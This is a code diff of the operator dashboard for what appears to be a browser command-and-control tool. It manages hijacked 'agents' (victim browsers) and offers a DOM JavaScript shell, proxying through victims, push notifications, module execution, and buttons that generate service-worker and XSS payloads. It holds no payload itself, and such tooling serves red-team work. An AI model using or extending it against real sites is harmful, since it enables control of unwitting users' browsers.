@@ -14,19 +14,25 @@ function resetAbortFetchAgentController(){
 function addAgents2sidebar(agent, sidebarId){
   var date = new Date(null);
   var aClass = (agent.active === 'true') ? 'active' : 'dormant' ;  
+
+  if (agent.active === 'false') {
+    closeButton = `<button type="button" class="close" aria-label="Close" data-action='delete-agent'>
+                    <i class="fas fa-times-circle shadow-none" style="color: red"></i>
+                    </button>`;
+  } else {
+    closeButton = ''
+  }
+
   var newAgent = `
   <li class="nav-item list-group" id="sidebar-${agent.id}">
     <a class="nav-link ${aClass}" href="#" data-agent-id='${agent.id}' data-action='show-agent'>
       <span data-feather="file-text"></span>
       <div class="card card-${aClass}">
-        <div class="card-body smaller-card">
-          ${agent.domain}`;
-          if(agent.active === 'false')
-            newAgent += `<button type="button" class="close" aria-label="Close" data-action='delete-agent'>
-                          <span aria-hidden="true">&times;</span>
-                         </button>`;
-          newAgent += `<br/>
-          Source: ${agent.ip}<br/>
+      <span class="d-block p-2 bg-secondary text-white" ><i class="far fa-user" style="color: white"></i> ${agent.id}
+      ${closeButton}
+      </span>
+      <div class="card-body smaller-card">
+      <i class="fas fa-network-wired"></i> ${agent.domain}<br/>
           </div>
       </div>
     </a>
@@ -43,10 +49,13 @@ function getModules(){
       for(i = 0; i < modules.length; i++){
         var autoLoaded = autoLoadedModules.indexOf(modules[i]) >= 0;
         var modulesHTML = `<hr/><img src="/static/images/tick.png"`;
-        if(!autoLoaded)
-          modulesHTML += ` class="hidden"`;
-        modulesHTML += `/> <a href='#' data-action='auto-load-module' data-loaded='${autoLoaded}' data-module-name='${modules[i]}'>${modules[i]}</a>`;
-        $('div#auto-load-modules').append(modulesHTML);
+        var modulesHTML = ` 
+        <div class="custom-control custom-switch col fetch-left" > 
+        <input id="${modules[i]}" type="checkbox" ${autoLoaded?'checked':''} class="custom-control-input" data-action='auto-load-module' data-loaded='${autoLoaded}' data-module-name='${modules[i]}' >
+        <label class="custom-control-label text-light" for="${modules[i]}"> ${modules[i]}</label>
+        </div>
+        `
+        $('div#automodules_settings').append(modulesHTML);
       }
     });
   });
@@ -119,17 +128,49 @@ function showAgent(agentID){
         agentDisplayed = agent;
       	agentHtml = `
       	<br/>
-      	<div class="jumbotron" id="agent_info_panel">
-      	  <h3 class="display-4">${agent.id}</h3>
+        <div class="jumbotron" id="agent_info_panel">
+        <div class="row">
+          <div class="col-6">
+            <h3 class="display-4">${agent.id}</h3>
+          </div>
+          <div class="col-6 float-right">
+          <button type="button" id="proxy-through-agent" class="btn btn-secondary" data-agent-id="${agent.id}"> <i class="fab fa-hubspot"></i> Proxy through Agent</button> 
+          <button type="button" class="btn btn-secondary" data-agent-id="${agent.id}" id="trigger-push"><i class="fas fa-bell"></i>Push</button>
+
+          `
+
+          // [Start] Dropdown button for modules
+          agentHtml += `
+          <button class="btn btn-secondary dropdown-toggle" type="button" id="ExecuteModules" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+          <i class="fas fa-rocket"></i> Modules
+          </button>
+          <div class="dropdown-menu" aria-labelledby="ExecuteModules">
+          `
+          for(i = 0; i < modules.length; i++){
+            if(!agent.modules || !(modules[i] in agent.modules))
+            //agentHtml += `<button type="button" data-module='true' data-module-name="${modules[i]}" class="btn btn-secondary" data-agent-id="${agent.id}">Execute ${modules[i]} Module</button> `;
+            agentHtml += `<a class="dropdown-item" href="#" data-module='true'data-module-name="${modules[i]}" data-agent-id="${agent.id}">${modules[i]}</a>`
+          }
+          agentHtml += `</div>`
+          // [End] Dropdown button for modules
+        agentHtml +=`</div>
+        </div>
       	  <br/>
-        	<b>IP:</b>${agent.ip}</b>
+        	<b><i class="fas fa-globe-americas"></i> IP:</b>${agent.ip}</b>
           <br/>
-          <b>UserAgent:</b>${agent.user_agent}<br>
-        	<b>Status:</b>`;
+          <b><i class="fas fa-user-cog"></i> UserAgent:</b>${agent.user_agent}<br>
+        	<i class="fas fa-clock"><b></i> First Seen:</b>
+          ${agent.first_seen} 
+          <br/>
+        	<i class="fas fa-sitemap"></i><b> Domain:</b>
+          <a href="https://${agent.domain}:${agent.port}" target="_blank">${agent.domain}:${agent.port}</a>
+          <br/>
+          <br/>
+        	<b>Service Worker Status:</b>`;
         if(agent.active == 'true')
-          agentHtml += `<p class='text-success'>Online</p>`;
+          agentHtml += `<p class='text-success'>Online <i class="fas fa-plug" style="color: LimeGreen"></i></p>`;
         else
-          agentHtml += `<p>Offline</p>`;
+          agentHtml += `<p>Offline <i class="fas fa-plug" style="color: Red"></i></p>`;
         agentHtml += `<b>DOM Status:</b>`;
 
         //[Start] DOM Status and Terminal Switch
@@ -138,43 +179,12 @@ function showAgent(agentID){
       
         <div class="custom-control custom-switch col fetch-left">
           <input type="checkbox" class="custom-control-input" id="show_dom_shell">
-          <label class="custom-control-label" for="show_dom_shell">DOM JS Shell2</label>
+          <label class="custom-control-label" for="show_dom_shell"><i class="fas fa-terminal"></i> DOM JS Shell</label>
         </div>
         </div>
         `
         //[End]  DOM Status and Terminal Switch
-        agentHtml += `<br/>
-        	<b>First Seen:</b>
-          ${agent.first_seen} 
-          <br/>
-        	<b>Domain Scope:</b>
-          <a href="https://${agent.domain}:${agent.port}" target="_blank">${agent.domain}:${agent.port}</a>
-          <br/>
-          <br/>
-          <input type="text" name="dom_command" id="dom-command-js"/>
-          <button type="button" id="dom-command" class="btn btn-secondary" data-agent-id="${agent.id}">Send JS to DOM</button>
-          `;
-        if(agent.dom_commands){
-            agentHtml += `<hr/>`;
-            for(var cmd in agent.dom_commands){
-              agentHtml += `<p><i>${cmd}</i>`;
-              if(agent.dom_commands[cmd] != null){
-                agentHtml += `<br/>${agent.dom_commands[cmd]}</p>`;
-              }
-              agentHtml += `<hr/>`;
-            }
-        }else{
-          agentHtml += `<hr/>`;
-        }
-        if(agent.active === 'true'){
-        	agentHtml += `<button type="button" id="proxy-through-agent" class="btn btn-secondary" data-agent-id="${agent.id}">Proxy through Agent</button> `;
-        }
-        for(i = 0; i < modules.length; i++){
-          if(!agent.modules || !(modules[i] in agent.modules))
-          agentHtml += `<button type="button" data-module='true' data-module-name="${modules[i]}" class="btn btn-secondary" data-agent-id="${agent.id}">Execute ${modules[i]} Module</button> `;
-        }
-        if(agent.push === 'true')
-          agentHtml += `<button type="button" class="btn btn-secondary" data-agent-id="${agent.id}" id="trigger-push">Trigger Push Notification</button>`;
+
         if(agent.modules){
           agentHtml += `<hr/>`;
           agentHtml += `<h3>Module Results:</h3>`;
@@ -192,6 +202,31 @@ function showAgent(agentID){
         agentHtml += `
         </div>`;        
         $mainPanel.html(agentHtml);
+
+        // Now that the agentHTML has been attached to dom, lets set the buttons status
+        $(function(){
+          if (proxyAgent==agentID){ // Set color of ProxyButton
+            $("button#proxy-through-agent").attr("class", "btn btn-success");
+          }
+          else{
+            $("button#proxy-through-agent").attr("class", "btn btn-secondary");
+          }
+
+          if(agent.active==="true"){ //Enable/disable proxy button
+            $("button#proxy-through-agent").removeAttr("disabled");
+          }
+          else{
+            $("button#proxy-through-agent").attr("disabled","true");
+          }
+
+          if(agent.push === 'true'){ // Enable/Disable Push button
+            $("button#trigger-push").removeAttr("disabled");
+          }
+          else{
+            $("button#trigger-push").attr("disabled","true");
+          }
+
+        })
     });
   });
 }
@@ -224,7 +259,7 @@ $(document).on("click", "#show_dom_shell", function() {
           }
 
         }).fail(function(response) {
-          term.echo("Failed..dom agent probably offline").resume();
+          term.echo("Timeout..dom agent probably offline.. JS will run the next time agent gets back online").resume();
 
         });
       });
@@ -237,34 +272,16 @@ $(document).on("click", "#show_dom_shell", function() {
 
 });
 
-// SEND JS TO VICTIM DOM IF EVER GETS TRIGGERED
-$(document).on("click", "button#dom-command", function(){
-  var js = $('input#dom-command-js').val();
-  if(js == '')
-    return;
-  var $btn = $(this);
-  fetch(dashUrl() + `/dom/${$btn.data('agent-id')}`, {
-    method: 'POST', 
-    body: JSON.stringify({'js': js}),
-    headers: {
-      'Accept': 'application/json',
-      'Content-Type': 'application/json'
-    }
-  }).then(function(res){
-    if(!res.ok){
-      $btn.attr("class", "btn btn-danger");
-    }
-    else{
-      $btn.attr("class", "btn btn-success");
-      setTimeout(function(){showAgent($btn.data('agent-id'))}, 1700);
-    }
-  });
-});
 
 // LOAD MODULE AGAINST AGENT
 $(document).on("click", "[data-module='true']", function(){
   var $btn = $(this);
-  fetch(dashUrl() + `/module/${$btn.data('module-name')}/${$btn.data('agent-id')}`, {method: 'POST'}).then(function(res){
+  fetch(dashUrl() + `/module/${$btn.data('module-name')}/${$btn.data('agent-id')}`, 
+    {
+      method: 'POST',
+      headers: new Headers({'content-type': 'application/json'})
+    }
+  ).then(function(res){
     if(!res.ok){
       $btn.attr("class", "btn btn-danger");
     }
@@ -285,12 +302,17 @@ $(document).on("click", "[data-action='delete-module']", function(){
 });
 
 // AUTO LOAD MODULE ON NEW AGENT
-$(document).on("click", "a[data-action='auto-load-module']", function(){
+$(document).on("click", "input[data-action='auto-load-module']", function(){
   var $btn = $(this);
   $btn.hide();
   var wasLoaded = $btn.data('loaded') === true;
   var method = wasLoaded ? 'DELETE' : 'POST';
-  fetch(dashUrl() + `/automodule/${$btn.data('module-name')}`, {method: method}).then(function(){
+  fetch(dashUrl() + `/automodule/${$btn.data('module-name')}`, 
+    {
+      method: method,
+      headers: new Headers({'content-type': 'application/json'})
+    }
+  ).then(function(){
     if(wasLoaded){
       $btn.prev().hide();
       $btn.data('loaded', false);
@@ -325,7 +347,12 @@ $(document).on("click", "button[data-action='delete-agent']", function(event){
 // TRIGGER PUSH
 $(document).on("click", "button#trigger-push", function(){
   var $btn = $(this);
-  fetch(dashUrl() + `/push/${$(this).data('agent-id')}`, {method: 'POST'}).then(function(res){
+  fetch(dashUrl() + `/push/${$(this).data('agent-id')}`, 
+    {
+      method: 'POST',
+      headers: new Headers({'content-type': 'application/json'})
+    }
+  ).then(function(res){
     if(!res.ok){
       $btn.attr("class", "btn btn-danger");
     }
@@ -351,6 +378,7 @@ $(document).on("click", "button#proxy-through-agent", function(){
 // CLEAR PROXY
 $(document).on("click", "a#clear-proxy", function(){
   if(proxyAgent !== null){
+    proxyAgent = null
   	fetch(proxyUrl() + '/C2_COMMAND?action=clearproxy', {method: 'GET', mode: "no-cors"}).then(function(){
       $("#proxy-status-bar").html('Status: Not Proxying');
       $("button#proxy-through-agent").attr("class", "btn btn-secondary");
@@ -358,14 +386,16 @@ $(document).on("click", "a#clear-proxy", function(){
   }
 });
 
-$(document).on("click", "a#generate-sw", function(){
-  fetch(c2Url() + `/modules/sw.js`).then(function(res){
-    if(res.ok){
-      res.text().then(function(res){
-        $('textarea#sw-result').text(res).show();
-      });
-    }
-  });
+//Generate SW.JS
+$(document).on("click", "#genSW", function(){
+  window.open("/modules/sw.js");
+
+});
+
+//Generate XSS.JS
+$(document).on("click", "#genXSS", function(){
+  window.open("/modules/xss");
+
 });
 
 $(document).on("click", "textarea#sw-result", function(){
@@ -395,3 +425,20 @@ $(document).ready(function(){
   });
 });
 
+// [Start] Settings overlay
+function openSettings() {
+  document.getElementById("SettingsOverlay").style.height = "100%";
+}
+
+function closeSettings() {
+  document.getElementById("SettingsOverlay").style.height = "0%";
+}
+
+$(document).on("click", "#btnSettingsClose", function(){
+  closeSettings()
+});
+
+$(document).on("click", "#btnSettingsOpen", function(){
+  openSettings()
+});
+// [End] Settings overlay
